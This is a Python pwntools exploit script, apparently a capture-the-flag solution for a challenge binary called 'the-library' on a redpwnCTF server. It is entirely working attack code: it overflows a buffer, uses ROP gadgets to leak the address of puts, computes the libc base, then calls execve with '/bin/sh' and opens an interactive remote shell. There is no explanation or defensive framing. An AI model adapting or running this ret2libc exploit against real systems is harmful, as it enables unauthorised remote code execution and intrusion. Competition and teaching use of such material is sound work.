from pwn import *

context.update(log_level= 'debug')


p = remote('2020.redpwnc.tf', 31350)

p.recvrepeat(1)


e = ELF('the-library')
addr_plt_puts = e.plt['puts']
addr_got_puts = e.got['puts']

addr_popRDI = 0x0000000000400733

libc = ELF('libc.so.6')
offset_puts = libc.symbols['puts']
offset_binsh = list(libc.search('/bin/sh'))[0]
offset_system = libc.symbols['system']
offset_execve = libc.symbols['execve']
log.info('offset_puts: ' + hex(offset_puts))
log.info('offset_binsh: ' + hex(offset_binsh))
log.info('offset_system: ' + hex(offset_system))
log.info('offset_execve: ' + hex(offset_execve))

addr_main = 0x400637

payload = 'a'*0x18 + p64(addr_popRDI) + p64(addr_got_puts) + p64(addr_plt_puts)
payload += p64(addr_main)

p.sendline(payload)

p.recvline()
p.recvline()

addr_libc_puts = u64(p.recv(7).replace('\n', '').ljust(8, '\x00'))
log.info('addr_libc_puts: ' + hex(addr_libc_puts))
addr_libc_base = addr_libc_puts - offset_puts
log.info('addr_libc_base: ' + hex(addr_libc_base))
addr_libc_binsh = addr_libc_base + offset_binsh
addr_libc_system = addr_libc_base + offset_system
log.info('addr_libc_system: ' + hex(addr_libc_system))
addr_libc_execve = addr_libc_base + offset_execve
log.info('addr_libc_execve: ' + hex(addr_libc_execve))

p.recvrepeat(1)
addr_popRSI = 0x0000000000400731 #pop rsi, r15 ret

payload = 'a'*0x18 + p64(addr_popRDI) + p64(addr_libc_binsh)
payload += p64(addr_popRSI) + p64(0)*2
payload += p64(addr_libc_execve)
p.sendline(payload)

p.interactive()

